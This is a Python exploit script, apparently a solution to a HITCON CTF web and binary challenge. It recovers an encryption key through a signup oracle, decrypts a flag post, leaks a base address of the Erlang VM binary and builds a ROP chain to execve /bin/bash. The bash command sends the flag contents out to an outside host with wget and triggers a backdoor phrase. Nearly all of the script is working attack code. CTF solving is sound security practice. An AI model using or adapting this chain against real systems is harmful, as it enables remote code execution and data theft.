import requests
import re
from Crypto.Hash import SHA512
from Crypto.Util.number import long_to_bytes
from pwn import *
from tqdm import tqdm
from base64 import b64decode

#url = "http://localhost:8000/"
url = "http://gleamering.chal.hitconctf.com:30002/"


# will just use usr_id as username and password
def signup(session, usr_id):
    signup_data = {"user": f"usr_{usr_id}", "pass": f"pass_{usr_id}", "id": str(usr_id)}
    res = session.post(url + "signup", data=signup_data)
    return res


def signin(session, usr_id):
    signin_data = {"user": f"usr_{usr_id}", "pass": f"pass_{usr_id}"}
    res = session.post(url + "login", data=signin_data)
    return res


post_id_pattern = re.compile('hx-get="/posts/(\\d+)"')


def create_post(session, content):
    res = session.post(
        url + "posts",
        cookies={"uid": session.cookies["uid"]},
        data={"content": content},
    )
    id_str = post_id_pattern.findall(res.text)[0]
    return int(id_str)


def encrypt_post(session, post_id):
    res = session.request(
        "PATCH", url + f"posts/{post_id}", cookies={"uid": session.cookies["uid"]}
    )
    content = res.text.split("<label>")[1].split("</label>")[0].strip()
    return content


def decrypt_post(session, post_id):
    res = session.request(
        "PATCH",
        url + f"posts/{post_id}/encrypt",
        cookies={"uid": session.cookies["uid"]},
    )
    content = res.text.split("<label>")[1].split("</label>")[0].strip()
    return content


def get_post(session, post_id):
    res = session.request(
        "GET", url + f"posts/{post_id}", cookies={"uid": session.cookies["uid"]}
    )
    content = res.text.split("<label>")[1].split("</label>")[0].strip()
    return content


def get_encrypted_post(session, post_id):
    res = session.request(
        "GET", url + f"posts/{post_id}/encrypt", cookies={"uid": session.cookies["uid"]}
    )
    content = res.text.split("<label>")[1].split("</label>")[0].strip()
    return content


def test(session):
    post_id = create_post(session, "123")
    print(post_id)
    print(get_post(session, post_id))
    encrypted = encrypt_post(session, post_id)
    print(encrypted)
    print(get_encrypted_post(session, post_id))
    decrypted = decrypt_post(session, post_id)
    print(decrypted)
    print(get_post(session, post_id))


session = requests.Session()
user_id = 10000
signup(session, user_id)
# test(session)
encrypted_flag = get_encrypted_post(
    session, -user_id + 2
)  # usr_id 1 msg_id 1 is the flag
print(encrypted_flag)
base = create_post(session, "123")

# oracle secret key
# round(usr_id + msg_id + key)


def oracle(goal):
    records = []
    try:
        global base
        user_id = goal - base - 1
        base += 1
        session = requests.Session()
        signup(session, user_id)
        post_id = create_post(session, f"dummy")
        encrypted = encrypt_post(session, post_id)
        # print(encrypted)
        decrypted = decrypt_post(session, post_id)
        # print(decrypted)
    except IndexError:
        return False

    return True


high = 1 << 53
low = 0

while high > low + 1:
    mid = (high + low) // 2
    print(mid)
    if oracle(mid + 1) and oracle(mid):
        low = mid
    else:
        high = mid

print(high, low)

key = (1 << 53) - high
print(key)


def decrypt(usr_id, msg_id, key, msg):
    actual_key = usr_id * 0xDEADBEEF + msg_id * 0xCAFEBABE + key * usr_id
    key_string = actual_key.to_bytes(16, "big")
    stream_key = SHA512.new(key_string).digest()
    return xor(stream_key, msg)


print(decrypt(1, 1, key, b64decode(encrypted_flag)))

session = requests.Session()
user_id = 9999
signup(session, user_id)
post_id = create_post(session, "")
print(post_id)
print(get_post(session, post_id))
encrypted = encrypt_post(session, post_id)
print(encrypted)
print(get_encrypted_post(session, post_id))
leak = u64(b64decode(encrypted))
print(hex(leak))


context.binary = './beam.smp'
elf = ELF("./beam.smp")
elf.symbols['syscall'] = 0x000000000021ceea # syscall gadget
elf.address = base = leak - elf.symbols["enif_alloc_binary"]
print(hex(base))

rop_payload = b"a"*cyclic_find(b"cdaaceaa")
#rop_payload = cyclic(2000)

# using ropper --chain as a base
rebase_0 = lambda x: p64(x+base)

def push_value(val, addr, rebase=False):
    ret = b""
    ret += rebase_0(0x0000000000244a74) # 0x0000000000244a74: pop rax; ret;
    if rebase:
        ret += rebase_0(0x0000000000a00940 + val)
    else:
        ret += p64(val)
    ret += rebase_0(0x00000000002edf74) # 0x00000000002edf74: pop rdi; ret;
    ret += rebase_0(0x0000000000a00940 + addr)
    ret += rebase_0(0x00000000002c1a97) # 0x00000000002c1a97: mov qword ptr [rdi], rax; ret;
    return ret

rop = b""

command = b"""cat > /tmp/run.sh <<EOF
wget https://example.com/`cat /flag`
EOF
cat /flag
chmod +x /tmp/run.sh
/tmp/run.sh&
"""

args = [b"/bin/bash", b"-c", b"-p", command]
counter = 0
arg_counter = []
for arg in args:
    arg_counter.append(counter)
    l = len(arg)
    arg_padded = arg.ljust(l+(8-l%8), b"\x00")
    for i in range(0, len(arg_padded), 8):
        rop += push_value(u64(arg_padded[i:i+8]), counter)
        counter += 8

argv_base = counter
for c in arg_counter:
    rop += push_value(c, counter, True)
    counter += 8

rop += push_value(0, counter)

rop += rebase_0(0x00000000002edf74) # 0x00000000002edf74: pop rdi; ret;
rop += rebase_0(0x0000000000a00940)
rop += rebase_0(0x00000000002ef030) # 0x00000000002ef030: pop rsi; ret;
rop += rebase_0(0x0000000000a00940 + argv_base)
rop += rebase_0(0x0000000000310d02) # 0x0000000000310d02: pop rdx; ret;
rop += rebase_0(0x0000000000a00940 + counter)
rop += rebase_0(0x0000000000244a74) # 0x0000000000244a74: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x000000000021ceea) # 0x000000000021ceea: syscall;

rop_payload+= rop
#rop_payload+= p64(0xcafebabe)

next_post_id = post_id+1

for user_id in tqdm(range(200000000)):
    backdoor_phrase = (b"$b4cKd0Or|").ljust(32, b"a")
    encrypted_backdoor = decrypt(user_id, next_post_id, key, backdoor_phrase)[:10]
    try:
        payload = encrypted_backdoor.decode()
        print(payload)
        print(decrypt(user_id, next_post_id, key, payload.encode()))
        print(payload+rop_payload.hex())
        session = requests.Session()
        signup(session, user_id)
        post_id = create_post(session, payload+rop_payload.hex())
        next_post_id = post_id + 1
        print(post_id)
        print(get_post(session, post_id))
        encrypted = encrypt_post(session, post_id)
        print(encrypted)
        print(get_encrypted_post(session, post_id))
        break
    except UnicodeDecodeError:
        continue




